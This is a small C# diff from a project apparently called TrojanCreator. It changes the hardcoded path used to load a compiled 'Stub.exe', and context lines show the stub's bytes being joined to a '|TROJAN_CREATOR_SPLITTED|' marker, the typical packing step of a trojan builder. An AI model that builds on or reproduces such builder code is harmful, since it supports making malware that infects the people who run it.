@@ -263,7 +263,7 @@ public partial class MainForm : MetroForm
 
             if (saveFileDialog2.ShowDialog().Equals(DialogResult.OK))
             {
-                byte[] currentBytes = System.IO.File.ReadAllBytes(@"C:\Users\gabry\Desktop\Computer\Developing\Progetti\GabryB03 GitHub\Repositories\TrojanCreator\Stub\bin\Release\Stub.exe");
+                byte[] currentBytes = System.IO.File.ReadAllBytes(@"C:\Users\gabry\Desktop\Computer\Developing\Progetti\ZygoteCode GitHub\Repositories\TrojanCreator\Stub\bin\Release\Stub.exe");
                 currentBytes = Combine(currentBytes, Encoding.UTF8.GetBytes("|TROJAN_CREATOR_SPLITTED|"));
                 bool initialized = false;
 
